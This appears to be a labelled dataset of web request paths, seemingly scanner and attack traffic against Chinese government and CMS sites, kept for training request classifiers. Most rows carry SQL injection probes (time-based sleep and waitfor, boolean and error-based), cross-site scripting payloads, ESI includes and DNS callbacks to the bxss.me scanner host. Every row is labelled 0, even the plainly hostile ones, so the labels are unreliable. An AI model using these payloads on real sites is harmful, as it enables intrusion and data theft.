sentences	labels
/****/category/jishuchuangxin?page=1 and 6369=6369 \r\n\r\n 	 0
/****/zzxxgk/tjj/0""xor(if(now()=sysdate(),sleep(15),0))xor""z_2127/jgzn_2042/list.html \r\n\r\n 	 0
/vc'||'/**/widgets/hanweb/iconfont/css/iconfont.css \r\n\r\n 	 0
/****/jwmsxf/pgt/javascript:void(0); \r\n\r\n 	 0
/****/b-161137.html \r\n\r\n 	 0
/**********/2021-03-0'xor(if(now()=sysdate(),sleep(6),0))xor'z.html \r\n\r\n 	 0
/******/resource/interview/room.jsp?wbinterviewid=1033%' and 5264=5264  \r\n\r\n 	 0
/xwzx'""()&%<acx><script >ysri(9448)</script>/****/sgaj/201812/t20181208_112298.html \r\n\r\n 	 0
/*******/wp_rokbox/thumb.php?src=<body onload=alert(777)>.jpg \r\n\r\n 	 0
/***/dorg/results.php?q='"--></style></script><script>alert(777)</script>&search=search&type=3 \r\n\r\n 	 0
/****/xxgknb/2013/http://bxss.me/t/fit.txt?.jpg.html \r\n\r\n 	 0
/*****/?cmd=new_section§ion="%3<script>alert(777);</script> \r\n\r\n 	 0
/**/reviews/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login="">alert(/777/)&assignee_login=&false_positives=without&sort=&asc=false&commit=search \r\n\r\n 	 0
/****/czgk/bmjs/zzqfyxt/\"javascript:void(0)\" \r\n\r\n 	 0
/*******/user/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) \r\n\r\n 	 0
/****/group-summary.jsp?search=test" onmouseover=alert(777) x=" \r\n\r\n 	 0
/**********/system/2010/08/01/010170721.shtml \r\n\r\n 	 0
/****/zdlygk/ncwywfgz/szss%' and 2*3*8=6*8 and '0jut'!='0jut%/plq/xmb_gzdxb.htm \r\n\r\n 	 0
/***/resource/asynctree/\"javascript:void(0)\" \r\n\r\n 	 0
/************/template/jcse/110105008056111/16/images/plugin/bxss.me/hzrecorder.js \r\n\r\n 	 0
/************/zijincunqu/javascript:void(0) \r\n\r\n 	 0
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 and 0990=1763-- \r\n\r\n 	 0
/**********/system/2021/11/18/javascript:void(0); \r\n\r\n 	 0
/****/rest/prototype/1/session/check/something<img src=a onerror=alert(777)> \r\n\r\n 	 0
/****/ajax_cmd.php?cmd=completgraphyrecording&filename=<img src=a onload=alert(777)> \r\n\r\n 	 0
/****/system/2021/09/08/013447520'""/><img src=x onerror=alert(1479)>.shtml \r\n\r\n 	 0
/****/web/search?searchword=1&channelid=287219%' or 8350=3035 /*&perpage=24&templet=1&token=1 \r\n\r\n 	 0
/******/system/2017/08/16/javascript:void(); \r\n\r\n 	 0
/****/wp-admin/admin.php?page=thecartpress/admin/addressedit.php&address_id='"><script>alert(77729;</script> \r\n\r\n 	 0
/*****/system/2012/02/28/javascript:window.close(); \r\n\r\n 	 0
/******/resource/interview/room.jsp?wbinterviewid=1033') or 7653=2493  \r\n\r\n 	 0
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqrlzyshbzt/\"javascript:void(0)\" \r\n\r\n 	 0
/****/web/search?page=2*/-->'""></iframe></script></style></title></textarea><script >alert(31788)</script>&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 \r\n\r\n 	 0
/****/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(3640)">?_=1630311982284 \r\n\r\n 	 0
/******/resource/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/jquery/jquery-latest.min.js \r\n\r\n 	 0
socket.gethostbyname('hitwl' 'npvxahpf5f8cf.bxss.me.')[3].to_s) '/******/tjj/zfxxgkml_2127/xwfbh_2065/list.html \r\n\r\n 	 0
/***/openemr/?site="">alert(777); \r\n\r\n 	 0
/****/zfwjn/bxss.me/1081/list.html \r\n\r\n 	 0
/****/20200630/e102919649.html \r\n\r\n 	 0
/*******/wbyqyu8.php \r\n\r\n 	 0
/****/xxgkzn<esi:include src=""http://bxss.me/rpb.png""/>/list.html \r\n\r\n 	 0
/****/ajax_cmd.php?cmd=completgraphyrecording&filename=<img src=a onload=alert(777)> \r\n\r\n 	 0
/************/template/jcse/110105008056111/16/images/plugin<esi:include src=""http://bxss.me/rpb.png""/>/selectpick/js.js \r\n\r\n 	 0
/******/visitcount/visit.jsp?i_columnid=1&i_webid[0]==2'and/**/convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1261367293')))>'0and 3 in &i_webid[1]=3&type=1 \r\n\r\n 	 0
/****/admin/ccmanage.php?find_enc=1&list=1"><script>alert(777)</script> \r\n\r\n 	 0
/*****/debug/cf_debugfr.cfm?userpage=javascript:alert(1) \r\n\r\n 	 0
/****/石阡县/*/-->'""></iframe></script></style></title></textarea><script >alert(44653)</script>?page=1 \r\n\r\n 	 0
/**/ui/widgets/hanweb/placeholder/css"" and 2*3*8=6*8 and ""rrxp""=""rrxp/placeholder.css \r\n\r\n 	 0
/****/ztly/lswh/201911/bxss.me/t/xss.html? \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/"><script>alert(4691)</script>?_=1630312105647 \r\n\r\n 	 0
/****/cat1.php?id2=0&pricestart=0&room=&flache=&price=&zulassung=&kilometer=&kraftstoff=&id3=0&suche="><script>alert(777);</script>&id=0&suchewo=&umkreis=0 \r\n\r\n 	 0
/****/web/search?page=2&channelid=253477&searchword=1 and 5581=7382--&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 \r\n\r\n 	 0
/******/visitcount/visit.jsp?i_articleid=0""xor(if(now()=sysdate(),sleep(15),0))xor""z&i_columnid=31&i_webid=1&type=3 \r\n\r\n 	 0
/****/actionhandler/ajax_managed_services.php \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/"><script>alert(3471)</script>?_=1630311899277 \r\n\r\n 	 0
/xwdt'||'/****/zjdt.htm \r\n\r\n 	 0
/****/bxss.me/tjj/ \r\n\r\n 	 0
/****/api/sources?resource=alert(/777/)&format=txt \r\n\r\n 	 0
/****/jsly/tzcl/201501/t20150129_52377.html' and 'x'='y \r\n\r\n 	 0
/****/web/search?page=2&channelid=253477&searchword=-1) or 8824=8824#&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 \r\n\r\n 	 0
/****/zjdt' and 2*3*8=6*8 and 'dboz'='dboz/csjs/zcwj/1.htm \r\n\r\n 	 0
/investors-garden/**********/video/if(now()=sysdate(),sleep(3),0)_2.html \r\n\r\n 	 0
/******/visitcount/visit.jsp?type=1&i_webid=1";select 1;&i_columnid=1 \r\n\r\n 	 0
/****/gccb/' and 'x'='x \r\n\r\n 	 0
/if(now()=sysdate(),sleep(15),0)/******/zfczyjs/list.html \r\n\r\n 	 0
/****/status_captiveportal.php?zone='"><script>alert(777);</script> \r\n\r\n 	 0
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448&wbfileid=51419') and 9662=5999 and ('1'='1 \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(1099)">?_=1630311736721 \r\n\r\n 	 0
/**********/system/more/213000000000000/0001/javascript:void(); \r\n\r\n 	 0
/****/system/2021/04/22/013373702'"/><script>alert(2405)</script>.shtml \r\n\r\n 	 0
/*******/8gc.php \r\n\r\n 	 0
/******/web/sa3/addholiday.do \r\n\r\n 	 0
/******/system/2016/08/20/javascript:void(); \r\n\r\n 	 0
/****/tzgg/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user \r\n\r\n 	 0
/****/web/search?channelid=299868' and 9069=3850 and '1'='1&perpage=1000 \r\n\r\n 	 0
/****/web/search?channelid=254846&searchword=天津 and 9304=9304 \r\n\r\n 	 0
/*********/index/login/index.html?fromurl=st4r7s<a	onpointerenter = [8].find(confirm)
/************/interfaces/autocomplete.do?cateid=1&eq=&oq=&p=1&pg=15&pos=&pq=&q=请输入关键词&ranksign=if(now()=sysdate(),sleep(15),0)&searchid=1&total=&tpl=16&websiteid=110105008056111 \r\n\r\n 	 0
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10%') and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),0)--  \r\n\r\n 	 0
/****/category/kuaguobinggou?page=1' or 5736=5736 /* \r\n\r\n 	 0
/****/web/search?searchword=1%') and 6949=6949  \r\n\r\n 	 0
/**********/system/2021/01/11/javascript:window.print() \r\n\r\n 	 0
/***/com/login.asp?logintype=xm' and 8492=6723 and 'tekc'='tekc \r\n\r\n 	 0
/****/"><script>alert(79)</script> \r\n\r\n 	 0
/******/cms/www/201707/27180304jgqr.jpg/*/-->'""></iframe></script></style></title></textarea><script >alert(34843)</script> \r\n\r\n 	 0
/************/template/jcse/110105008056111/16/bxss.me/plugin/websitechange/zwdt_v3.css \r\n\r\n 	 0
/****/byysqgk/"".gethostbyname(lc(""hitkd"".""ptysbdxm00bcb.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(118).chr(83).chr(97).chr(82).""/list.html \r\n\r\n 	 0
/************/template/jcse/http://bxss.me/t/fit.txt/16/images/jquery.cookie.js \r\n\r\n 	 0
/************/kehuxuzhi' and 2*3*8=6*8 and 'odzx'='odzx/ \r\n\r\n 	 0
/******/rss/rssfeed.jsp/""><script>alert(5737)</script>?colid=33 \r\n\r\n 	 0
/****/sj1/jjzs/202108/http://bxss.me/t/fit.txt_2986071.html \r\n\r\n 	 0
/****/if(now()=sysdate(),sleep(12),0).htm \r\n\r\n 	 0
/******/system/2018/02/04/javascript:window.print() \r\n\r\n 	 0
/****/web/search?page=2&channelid=253477%' and 7076=7076 and '%'='&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 \r\n\r\n 	 0
/**********/system/2021/12/04/javascript:window.print() \r\n\r\n 	 0
/images'||'/***/layout.css \r\n\r\n 	 0
/****/user/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) \r\n\r\n 	 0
/****/zfwjn/1088/1093/list.html?new=0.7199116495223474<esi:include src=""http://bxss.me/rpb.png""/> \r\n\r\n 	 0
/****/gfxwj/5620/7228/\"javascript:void(0)\" \r\n\r\n 	 0
/***/mavideo/gvideos.php?gid=1 and 1=1 \r\n\r\n 	 0
/****/web/search?page=2%') or 7384=5679  \r\n\r\n 	 0
/*******/8z4fls.php \r\n\r\n 	 0
/****/category/fengxianfangfan?page=1' or 0889=5100 /* \r\n\r\n 	 0
/****/user/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) \r\n\r\n 	 0
/****/app?adminemail=<script>alert(777)</script>&smtpserver=127.0.0.1&smtpport=25&smtpuser=<script>alert(777)</script>&smtppassword=admin&smtpsecurity=none&proceedbutton=save&operation=config&st=savesmtp \r\n\r\n 	 0
/******/system/2016/10/07/javascript:window.close(); \r\n\r\n 	 0
/***/wp_rokbox/thumb.php?src=<body onload=alert(777)>.jpg \r\n\r\n 	 0
/xwdt'||'/****/jhcw/gzdt.htm \r\n\r\n 	 0
/*****/system/2020/09/11/javascript:void(0); \r\n\r\n 	 0
/******/user/gallery1.php?g_name=<script>alert(77729</script> \r\n\r\n 	 0
/****/zfxxgk1/if(now()=sysdate(),sleep(12),0).htm \r\n\r\n 	 0
/*/170822-'""()&%<acx><script >rcwk(9465)</script>/index/06defa41f3b0c6ebc8da65f95d7f2f20.css \r\n\r\n 	 0
socket.gethostbyname(""hitgy"" ""iqyspgfs62550.bxss.me."")[3].to_s) ""/******/voice/hzrecorder.js \r\n\r\n 	 0
/****/byszf/sz/202108/t20210806_http://bxss.me/t/fit.txt.html \r\n\r\n 	 0
/****/web/search?searchword=1%' or 7659=7764 /*&channelid=287219&perpage=24&templet=1&token=1 \r\n\r\n 	 0
/****/xxgknb/2013/list.html?new='""()&%<acx><script >j2by(9349)</script> \r\n\r\n 	 0
/*******/qjf7vf.php \r\n\r\n 	 0
//***********/html/demo12.html \r\n\r\n 	 0
/****/web/search?channelid=299868') and 2687=2687  \r\n\r\n 	 0
/****/ygzpxx/201810/t20181031_194422.html' and 'x'='x \r\n\r\n 	 0
/if(now()=sysdate(),sleep(12),0)/******/ncwywfgz/1.htm \r\n\r\n 	 0
/**/server/news/show/title/"><script>alert(777)</script>time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c \r\n\r\n 	 0
/***/mavideo/gvideos.php?gid=1 and 1=1 \r\n\r\n 	 0
/******/help/search.php?query=""onmouseover=""alert(1); \r\n\r\n 	 0
/******/system/2020/10/01/javascript:void(); \r\n\r\n 	 0
/****/web/search?channelid=222832&searchword=); waitfor delay '0:0:2 \r\n\r\n 	 0
/**/zp-core/admin-upload.php?error=<script>alert(777)</script> \r\n\r\n 	 0
/************/template/jcse//xfs.bxss.me/16/images/catesearchbtn.js \r\n\r\n 	 0
/**/products/ \r\n\r\n 	 0
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448' or 3359=2140 and '1'='1 \r\n\r\n 	 0
/***/col40/index.html/<img src="javascript:alert(930)"> \r\n\r\n 	 0
/****/javascript:void(0); \r\n\r\n 	 0
/****/system/2021/07/21/javascript:window.close(); \r\n\r\n 	 0
/****/if(now()=sysdate(),sleep(12),0)/czjs/gzdt.htm \r\n\r\n 	 0
/*****/system/2021/12/14/javascript:window.print() \r\n\r\n 	 0
/******/resource'||'/js/vsb_news_search_entry.js \r\n\r\n 	 0
/************/template/jcse/110105008056111/16/images/plugin/voice'||'/voice.css \r\n\r\n 	 0
/*****/20200811/javascript:void(0); \r\n\r\n 	 0
/****/czgk/bmyjs/rmtt/ql/\"javascript:void(0)\" \r\n\r\n 	 0
/****/category/zixunfuwu?page=1' or 5708=5708 /* \r\n\r\n 	 0
/****/gg/"><script>alert(306)</script> \r\n\r\n 	 0
/****/xxgkml/rsrm/list.html?new=0.5540579994588073'""()&%<acx><script >k1by(9599)</script> \r\n\r\n 	 0
/**********/system/2021/10/14/javascript:window.print() \r\n\r\n 	 0
/****/zzxxgk/http://bxss.me/t/fit.txt?.jpg/zfxxgkml_2127/xwfbh_2065/list.html \r\n\r\n 	 0
/******/visitcount/visit.jsp?type=3&i_articleid=239572&i_columnid=37&i_webid=1' and 'x'='x \r\n\r\n 	 0
/***/ebs_sub6.cgi \r\n\r\n 	 0
/script%' and 2*3*8=6*8 and 'j6w2'!='j6w2%/*/1905211146429566.js \r\n\r\n 	 0
/****/abantecart/index.php?rt=product/manufacturer&manufacturer_id=15"><script>alert(777);</script> \r\n\r\n 	 0
/****/gjzqq/index.html?continent=%') or 1182=1182 and '%'=' \r\n\r\n 	 0
/****/system/2020/12/01/javascript:window.close(); \r\n\r\n 	 0
/******/resource/js/newcalendar/wdatepicker'||'.js \r\n\r\n 	 0
/******/system/2018/02/04/javascript:window.close(); \r\n\r\n 	 0
/****/zzxxgk/tjj/zfxxgkml_http://bxss.me/t/fit.txt/jgzn_2042/list.html \r\n\r\n 	 0
/****/form.jspx?id=";window.top._web_js_namespace_taint_tracer.log_execution_flow_sink()"&channelid=1542 \r\n\r\n 	 0
/****/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/csjs/zcwj/1.htm \r\n\r\n 	 0
/******/download/downfile.jsp?classid=0&filename=06c080ad774b497c8312530658e028b8.doc%' and 1=1 and '%'=' \r\n\r\n 	 0
/****/gcspzdgg%' and 2*3*8=6*8 and 'qtqn'!='qtqn%.htm \r\n\r\n 	 0
/*******/ov8kl.php \r\n\r\n 	 0
/******/system/2016/11/03/javascript:void(0); \r\n\r\n 	 0
/****/system/2020/04/03/javascript:window.print() \r\n\r\n 	 0
/****/2020wzqh/wzqh_zyjs/' and 'x'='y \r\n\r\n 	 0
/****//828/j6u78dwl/xhr_send?t=1632366661108 \r\n\r\n 	 0
/*******/r92j738.php \r\n\r\n 	 0
socket.gethostbyname(""hitfl"" ""kiaadwwz01110.bxss.me."")[3].to_s) ""/****/list.html \r\n\r\n 	 0
/images'||'/*/xys.css \r\n\r\n 	 0
/*****/mavideo/gvideos.php?gid=1 and 1=2 \r\n\r\n 	 0
/*/public/viewclick/?addclick=1&classid=243&id=1 waitfor delay '0:0:10.431' --  \r\n\r\n 	 0
/****/category/zhengcegoutong?page=*/-->'""></iframe></script></style></title></textarea><script >alert(04321)</script> \r\n\r\n 	 0
/****/files.php?folder="">alert(777) \r\n\r\n 	 0
/******/server/news/show/title/time-for-a-heavy-harvest-new-release/src/"><script>alert(777)</script>@random4cd201e063d5c \r\n\r\n 	 0
/****/netflow/jspui/j_security_check?radiususerenabled=false&authrule_name=authenticator&j_username=admin52f43'><script>alert(777)</script>6f472a19875&j_password=admin \r\n\r\n 	 0
/vc' and 2*3*8=6*8 and 'rd2t'='rd2t/**/lib/security/crypto-js.js \r\n\r\n 	 0
/*******/exmppqjk.php \r\n\r\n 	 0
/******/sjd/javascript:void(0) \r\n\r\n 	 0
/****/zfwjn'""()&%<acx><script >ij8q(9301)</script>/1088/1104/list.html \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(6291)">?_=1630312283968 \r\n\r\n 	 0
/******/resource/js/newcalendar'||'/my97datepicker.htm \r\n\r\n 	 0
/**/jspmyadmin/tabledata.jsp?server=localhost&db=mysql&table=""/>alert(777); \r\n\r\n 	 0
/****/web/search?page=2&channelid=253477&searchword=1&keyword=*/-->'""></iframe></script></style></title></textarea><script >alert(66057)</script>&orderby=-docreltime&perpage=15&outlinepage=10 \r\n\r\n 	 0
/***/index.cfm?fuseaction=clogin.main&returnurl=&status=sendlogin&email=alert(777) \r\n\r\n 	 0
/****/system/2016/11/10/javascript:window.print() \r\n\r\n 	 0
/****/system/2020/12/03/javascript:dozoom(9) \r\n\r\n 	 0
/****/20160928/javascript:void(0); \r\n\r\n 	 0
socket.gethostbyname(""hitky"" ""wvskrjgl6b8f5.bxss.me."")[3].to_s) ""/**/images/searchbtn.js \r\n\r\n 	 0
/**/reviews/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="">alert(/777/)&false_positives=without&sort=&asc=false&commit=search \r\n\r\n 	 0
/******/resource'||'/js/counter.js \r\n\r\n 	 0
/*****/phppressrelease/administration.php?pageaction=saverelease&subaction=submit&dateday=&datemonthnewedit=&dateyearnewedit=&title=<script>alert('777')</script>&summary=deneme&releasebody=deneme&categorynewedit=1&publish=active \r\n\r\n 	 0
/****/web/search?searchword=1&perpage=24&templet=1&token=1 \r\n\r\n 	 0
/****/zzxxgk/tjj/zfxxgkml_2127/jytabljg_2061/"".gethostbyname(lc(""hitix"".""cavwndqw61472.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(116).chr(82).chr(114).chr(80)."".html \r\n\r\n 	 0
/****/web/search?perpage=20&outlinepage=10' waitfor delay '0:0:2&keyword=1&channelid=240998&searchword=1&page=10 \r\n\r\n 	 0
/******/resource'||'/js/centercutimg.js \r\n\r\n 	 0
/****/whhd/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user \r\n\r\n 	 0
/***/cms/gobottom.do?urlname=0c806a55ba5f4242a0af16456f349d3c'||' \r\n\r\n 	 0
/**/mswpmm/common/signin.aspx?btnsignin=alert(777)returnurl=/mswpmm/common/default.aspx \r\n\r\n 	 0
socket.gethostbyname(""hitpn"" ""vthvzgdm821de.bxss.me."")[3].to_s) ""/****/110105008056111/16/images/condition.js \r\n\r\n 	 0
/****/system/2021/12/15/javascript:window.close(); \r\n\r\n 	 0
/****/xxgkzd/http://bxss.me/t/fit.txt?.jpg.html \r\n\r\n 	 0
/****/wp_rokbox/thumb.php?src=<body onload=alert(777)>.jpg \r\n\r\n 	 0
/****//xfs.bxss.me/swsj/ \r\n\r\n 	 0
/****/bysw/"".gethostbyname(lc(""hitql"".""fkamwvet3a65a.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(121).chr(75).chr(113).chr(69).""/ \r\n\r\n 	 0
/****/zdlygk/ncwywfgz/wzs/qtxs/xmb_gzdxb%' and 2*3*8=6*8 and '6eex'!='6eex%.htm \r\n\r\n 	 0
/****/index.php?m=&c=ajaxpersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa"") and extractvalue(1,concat(0x7e,md5(99999999))) -- a \r\n\r\n 	 0
/investors-garden/******/intermediary/2020-if(now()=sysdate(),sleep(12),0)-15/1536.html \r\n\r\n 	 0
/**/wd-demo/index.php?c=prompt(777) \r\n\r\n 	 0
/****/mydevice/index.jsp?locale=""><script>alert(777)</script> \r\n\r\n 	 0
/******/avatar/ea/eacab01c0cd864ea338ffc133a4c32d6.jpg?v=2021041918) and 5681=(select 5681 from pg_sleep(5)) and (5729=5729 \r\n\r\n 	 0
/******//xfs.bxss.me/1905211146429566.js \r\n\r\n 	 0
/***/mobile_h5/waparticledetail.do?article_id=201910091452191072&contenttype=article \r\n\r\n 	 0
/***//886/71dagj0y/xhr_send?t=1629428873755 \r\n\r\n 	 0
/*******/pit.php \r\n\r\n 	 0
/jsearchfront'||'/********/jcse/110105008056111/16/images/plugin/criteria/criteria.js \r\n\r\n 	 0
/****/jzgj/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 0
/****/reviews/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="">alert(/777/)&false_positives=without&sort=&asc=false&commit=search \r\n\r\n 	 0
/**/advanced-search/?term=asdf&"><script>alert(777)</script> \r\n\r\n 	 0
/**********/system/2021/10/08/javascript:void(); \r\n\r\n 	 0
/**/sgsjs/window.location.search, \r\n\r\n 	 0
/****/联系我们新华丝路一带一路数据库?page='""()&%<acx><script >o7ha(9971)</script> \r\n\r\n 	 0
/xwdt%' and 2*3*8=6*8 and 'lly4'!='lly4%/****/zjdt/gzdt.htm \r\n\r\n 	 0
/******/system/2017/11/15/javascript:window.print() \r\n\r\n 	 0
/******/business-area/quotation-service/2017-0'xor(if(now()=sysdate(),sleep(9),0))xor'z-22/687.html \r\n\r\n 	 0
/*******/7q8k.php \r\n\r\n 	 0
/****/category/gaocengdongtai?page=1') and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),0)--  \r\n\r\n 	 0
/****/web/search?channelid=222832&outlinepage=10&page=4172&perpage=20)); waitfor delay '0:0:2 \r\n\r\n 	 0
/****/jspmyadmin/tabledata.jsp?server=localhost&db=mysql&table=""/>alert(777); \r\n\r\n 	 0
/******/download/downfile.jsp?classid=0&filename=0'xor(if(now()=sysdate(),sleep(15),0))xor'z \r\n\r\n 	 0
/***/col138/index.html/<img src="javascript:alert(451)"> \r\n\r\n 	 0
/******/jslib/ckplayer/bxss.me.js \r\n\r\n 	 0
/*******/dww7955.php \r\n\r\n 	 0
/***/config.php \r\n\r\n 	 0
/****/xxgkml/zfczyjs/list.html?new=bxss.me \r\n\r\n 	 0
/****/web/search?searchword=1&channelid=287219&perpage=24 and if(now()=sysdate(),sleep(0),0)/*'xor(if(now()=sysdate(),sleep(0),0))or'""xor(if(now()=sysdate(),sleep(0),0))or""*/&templet=1&token=1 \r\n\r\n 	 0
/***/0/00/83/21/832122_479304.jpg \r\n\r\n 	 0
/************/interfaces/spellcheck.do?if(now()=sysdate(),sleep(15),0) \r\n\r\n 	 0
/************/template/jcse/110105008056111/16/bxss.me/condition.js \r\n\r\n 	 0
/investors-garden/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/*******/2020-02-27/8981.html \r\n\r\n 	 0
/******/resource/code/news/click/clicktimes.jsp?wbnewsid=67878&owner=1707212448&type=wbnewsfile&randomid=nattach \r\n\r\n 	 0
/****/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/bzxajgc/ycs/hlx.htm \r\n\r\n 	 0
/wp-content/*******/resd.php \r\n\r\n 	 0
/************/categorysearch.do?cateid=1&eq=1&oq=1&p=1&pg=15&pos=1&pq=/xfs.bxss.me&q=请输入关键词&ranksign=1&searchid=1&total=1&tpl=16&websiteid=110105008056111 \r\n\r\n 	 0
/**********/system/2007/05/24/002124227.shtml \r\n\r\n 	 0
/****/gjzqq/index.html?continent=%') or 8600=8600 /* \r\n\r\n 	 0
/****/byszx/201903/t20190322_115445.html?leader=余进祥'""()&%<acx><script >m1ld(9830)</script> \r\n\r\n 	 0
/****/category/zixunfuwu?*/-->'""></iframe></script></style></title></textarea><script >alert(58282)</script>=1 \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/"><script>alert(647)</script>?_=1630311538664 \r\n\r\n 	 0
/searchfinancial.jspx?channelid=1480&producttype=2&querystr=1&renew=0<esi:include src=""http://*******/rpb.png""/>&termtype=0 \r\n\r\n 	 0
/******/mswpmm/common/signin.aspx?tbpassword=alert(777)returnurl=/mswpmm/common/default.aspx \r\n\r\n 	 0
